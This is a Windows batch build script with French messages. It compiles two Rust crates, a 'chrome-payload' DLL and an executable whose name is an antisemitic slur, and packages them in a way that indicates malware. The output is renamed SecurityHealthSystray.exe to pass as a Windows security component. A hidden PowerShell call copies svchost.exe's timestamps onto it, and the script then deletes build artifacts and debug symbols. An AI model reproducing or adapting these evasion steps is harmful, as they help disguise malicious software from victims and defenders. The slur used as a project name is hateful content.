@echo off
setlocal enabledelayedexpansion

set "PATH=%USERPROFILE%\.cargo\bin;%PATH%"
set "CARGO_TERM_COLOR=never"
set "CARGO_PROFILE=stealth"
set "OUT_DIR=out"
set "OUT_NAME=SecurityHealthSystray.exe"
set "REF_TS=%SystemRoot%\System32\svchost.exe"
set "LOG=%~dp0build.log"

cd /d "%~dp0"
del /F /Q "%LOG%" >nul 2>&1

echo === Build stealth ===
echo.

call :ensure_rust
if errorlevel 1 goto fail_rust

call :ensure_msvc
if errorlevel 1 goto fail_msvc

call :do_build
if errorlevel 1 goto fail_build

call :post_process
if errorlevel 1 goto fail_post

call :cleanup_artifacts
echo.
echo OK: %OUT_DIR%\%OUT_NAME%
del /F /Q "%LOG%" >nul 2>&1
pause
exit /b 0

:ensure_rust
where rustc >nul 2>&1
if not errorlevel 1 (
    echo [OK] Rust
    exit /b 0
)
echo [*] Installation Rust...
curl -fsSL -o "%TEMP%\rustup-init.exe" https://win.rustup.rs/x86_64
"%TEMP%\rustup-init.exe" -y --default-toolchain stable
set "PATH=%USERPROFILE%\.cargo\bin;%PATH%"
where rustc >nul 2>&1 || exit /b 1
echo [OK] Rust installe
exit /b 0

:ensure_msvc
call :find_vcvars
if defined VCVARS (
    if exist "!VCVARS!" (
        call "!VCVARS!" >nul 2>&1
        where cl >nul 2>&1
        if not errorlevel 1 (
            echo [OK] Visual C++
            exit /b 0
        )
    )
)
where link >nul 2>&1
if not errorlevel 1 (
    echo [OK] link.exe
    exit /b 0
)
exit /b 1

:find_vcvars
set "VCVARS="
set "VSWHERE=%ProgramFiles(x86)%\Microsoft Visual Studio\Installer\vswhere.exe"
if exist "%VSWHERE%" (
    for /f "usebackq delims=" %%I in (`"%VSWHERE%" -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath 2^>nul`) do (
        if exist "%%I\VC\Auxiliary\Build\vcvars64.bat" (
            set "VCVARS=%%I\VC\Auxiliary\Build\vcvars64.bat"
        )
    )
)
if defined VCVARS exit /b 0
for %%Y in (2026 2025 2022) do (
    for %%E in (BuildTools Community Professional Enterprise) do (
        set "_C=C:\Program Files\Microsoft Visual Studio\%%Y\%%E\VC\Auxiliary\Build\vcvars64.bat"
        if exist "!_C!" set "VCVARS=!_C!"
    )
)
exit /b 0

:do_build
echo.
echo [1/2] chrome-payload...
cargo build --profile stealth -p chrome-payload
if errorlevel 1 exit /b 1
if not exist "target\stealth\chrome_payload.dll" (
    echo [X] chrome_payload.dll absent dans target\stealth\
    exit /b 1
)
echo [OK] chrome_payload.dll

echo.
echo [2/2] jewish...
cargo build --profile stealth -p jewish
if errorlevel 1 exit /b 1
if not exist "target\stealth\jewish.exe" (
    echo [X] jewish.exe absent dans target\stealth\
    exit /b 1
)
echo [OK] jewish.exe
exit /b 0

:post_process
if not exist "%OUT_DIR%" mkdir "%OUT_DIR%"
copy /Y "target\stealth\jewish.exe" "%OUT_DIR%\%OUT_NAME%" >nul
if errorlevel 1 exit /b 1
if not exist "%OUT_DIR%\%OUT_NAME%" exit /b 1

if exist "%REF_TS%" (
    powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
        "$d=Get-Item '%REF_TS%'; $f=Get-Item '%OUT_DIR%\%OUT_NAME%';" ^
        "$f.LastWriteTime=$d.LastWriteTime; $f.CreationTime=$d.CreationTime;" ^
        "$f.LastAccessTime=$d.LastAccessTime" >nul 2>&1
)
exit /b 0

:cleanup_artifacts
if exist "target\stealth\chrome_payload.dll" del /F /Q "target\stealth\chrome_payload.dll" >nul 2>&1
if exist "target\stealth\jewish.exe" del /F /Q "target\stealth\jewish.exe" >nul 2>&1
if exist "target\stealth\jewish.pdb" del /F /Q "target\stealth\jewish.pdb" >nul 2>&1
if exist "target\stealth\deps\chrome_payload.dll" del /F /Q "target\stealth\deps\chrome_payload.dll" >nul 2>&1
if exist "target\stealth\deps\chrome_payload.dll.exp" del /F /Q "target\stealth\deps\chrome_payload.dll.exp" >nul 2>&1
if exist "target\stealth\deps\chrome_payload.dll.lib" del /F /Q "target\stealth\deps\chrome_payload.dll.lib" >nul 2>&1
if exist "target\stealth\deps\chrome_payload.pdb" del /F /Q "target\stealth\deps\chrome_payload.pdb" >nul 2>&1
if exist "release" rmdir /S /Q "release" >nul 2>&1
exit /b 0

:fail_rust
echo.
echo [X] Rust introuvable. Installe https://rustup.rs puis relance.
pause
exit /b 1

:fail_msvc
echo.
echo [X] Visual C++ Build Tools introuvable.
echo     Installe "Desktop development with C++" (VS Build Tools 2022).
pause
exit /b 1

:fail_build
echo.
echo [X] Echec compilation. Details dans build.log
pause
exit /b 1

:fail_post
echo.
echo [X] Echec copie vers %OUT_DIR%\%OUT_NAME%
pause
exit /b 1
